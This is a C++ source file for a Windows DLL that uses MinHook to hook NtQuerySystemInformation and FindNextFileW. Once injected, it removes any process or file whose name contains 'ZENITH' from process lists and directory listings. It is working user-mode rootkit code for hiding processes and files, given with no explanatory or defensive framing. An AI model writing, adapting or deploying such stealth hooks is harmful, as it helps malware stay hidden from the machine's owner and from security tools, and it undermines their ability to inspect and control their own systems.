#include <vector>
#include <string>
#include <Windows.h>
#include <winternl.h>
#include "Libraries/Minhook/MinHook.h"

#pragma pack(push,8)
struct SYSTEM_PROCESS {
	ULONG          NextEntryOffset;
	ULONG          ThreadCount;
	LARGE_INTEGER  WorkingSetPrivateSize;
	ULONG          HardFaultCount;
	ULONG          NumberOfThreadsHighWatermark;
	ULONGLONG      CycleTime;
	LARGE_INTEGER  CreateTime;
	LARGE_INTEGER  UserTime;
	LARGE_INTEGER  KernelTime;
	UNICODE_STRING ImageName;
	LONG           BasePriority;
	PVOID          UniqueProcessId;
	PVOID          InheritedFromUniqueProcessId;
};
#pragma pack(pop)

std::vector<std::string> processesToHide = {
	"ZENITH",
};

DWORD64 ntQuerySysInfoOrig = 0;
LONG __stdcall NtQuerySysInfoHk(
	SYSTEM_INFORMATION_CLASS systemInformationClass,
	PVOID systemInformation,
	ULONG systemInformationLength,
	PULONG returnLength) {

	typedef NTSTATUS(_stdcall* NtQuerySysInfoDef)(SYSTEM_INFORMATION_CLASS systemInformationClass, PVOID systemInformation, ULONG systemInformationLength, PULONG returnLength);
	NTSTATUS result = reinterpret_cast<NtQuerySysInfoDef>(ntQuerySysInfoOrig)(systemInformationClass, systemInformation, systemInformationLength, returnLength);

	if (!NT_SUCCESS(result) || systemInformationClass != SYSTEM_INFORMATION_CLASS::SystemProcessInformation)
		return result;

	SYSTEM_PROCESS* lastSysProc = reinterpret_cast<SYSTEM_PROCESS*>(systemInformation);
	SYSTEM_PROCESS* currentSysProc = reinterpret_cast<SYSTEM_PROCESS*>(reinterpret_cast<char*>(lastSysProc) + lastSysProc->NextEntryOffset);

	while (currentSysProc->NextEntryOffset != 0) {

		bool doesntMatchAny = true;
		for (const auto& processName : processesToHide) {

			char converted[260] = { 0 };
			size_t convertedNum = 0;
			if (wcstombs_s(&convertedNum, converted, 260, currentSysProc->ImageName.Buffer, currentSysProc->ImageName.Length))
				continue;

			// Check if the current process is a process to hide
			if (!strstr(converted, processName.c_str()))
				continue;

			doesntMatchAny = false;
			break;
		}

		if (doesntMatchAny == false) {
			// Shift to next process
			lastSysProc->NextEntryOffset += currentSysProc->NextEntryOffset;
			currentSysProc = reinterpret_cast<SYSTEM_PROCESS*>(reinterpret_cast<char*>(currentSysProc) + currentSysProc->NextEntryOffset);
			continue; // Try another time
		}

		lastSysProc = currentSysProc;
		currentSysProc = reinterpret_cast<SYSTEM_PROCESS*>(reinterpret_cast<char*>(currentSysProc) + currentSysProc->NextEntryOffset);

	}

	return result;
}
bool HookNtQuerySysInfo() {
	
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == INVALID_HANDLE_VALUE || ntdll == NULL)
		return false;

	FARPROC ntQuerySysLoc = GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (!ntQuerySysLoc)
		return false;

	MH_STATUS status = MH_CreateHook(reinterpret_cast<LPVOID>(ntQuerySysLoc), reinterpret_cast<void**>(NtQuerySysInfoHk), reinterpret_cast<void**>(&ntQuerySysInfoOrig));
	if (status != MH_OK)
		return false;

	status = MH_EnableHook(reinterpret_cast<LPVOID>(ntQuerySysLoc));
	if (status != MH_OK)
		return false;

	return true;
}

DWORD64 findNextFileWOrig = 0;
BOOL __stdcall FindNextFileWHk(
	HANDLE hFindFile, 
	LPWIN32_FIND_DATAW lpFindFileData) {

	typedef BOOL(_stdcall* FindNextFileWDef)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
	BOOL result = reinterpret_cast<FindNextFileWDef>(findNextFileWOrig)(hFindFile, lpFindFileData);

	if (result != TRUE)
		return result;

	while (true) {
		bool doesntMatchAny = true;
		for (const auto& processName : processesToHide) {

			char converted[260] = { 0 };
			size_t convertedNum = 0;
			if (wcstombs_s(&convertedNum, converted, 260, lpFindFileData->cFileName, 260))
				continue;

			// Check if the current process is a process to hide
			if (!strstr(converted, processName.c_str()))
				continue;

			doesntMatchAny = false;
			break;
		}

		if (doesntMatchAny)
			break;

		// Execute FindNextFile
		result = reinterpret_cast<FindNextFileWDef>(findNextFileWOrig)(hFindFile, lpFindFileData);
		if (!result)
			break;
	}

	return result;
}
bool HookFindNextFileW() {

	HMODULE kernelBase = GetModuleHandleA("KernelBase.dll");
	if (kernelBase == INVALID_HANDLE_VALUE || kernelBase == NULL)
		return false;

	FARPROC findNextFileLoc = GetProcAddress(kernelBase, "FindNextFileW");
	if (!findNextFileLoc)
		return false;

	MH_STATUS status = MH_CreateHook(reinterpret_cast<LPVOID>(findNextFileLoc), reinterpret_cast<void**>(FindNextFileWHk), reinterpret_cast<void**>(&findNextFileWOrig));
	if (status != MH_OK)
		return false;

	status = MH_EnableHook(reinterpret_cast<LPVOID>(findNextFileLoc));
	if (status != MH_OK)
		return false;

	return true;
}

int main(HMODULE moduleHandle) {

	MH_STATUS status = MH_Initialize();
	if (status != MH_OK)
		FreeLibraryAndExitThread(moduleHandle, 1);

	if (!HookNtQuerySysInfo() || !HookFindNextFileW()) {
		MH_DisableHook(MH_ALL_HOOKS);
		MH_Uninitialize();
		FreeLibraryAndExitThread(moduleHandle, 1);
	}

	while (true)
		Sleep(1000);

	return 0;
}

BOOL APIENTRY DllMain(HMODULE moduleHandle, DWORD callReason, LPVOID reserved) {
    if (callReason == DLL_PROCESS_ATTACH)
        CreateThread(0, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(main), moduleHandle, 0, 0);
    return TRUE;
}

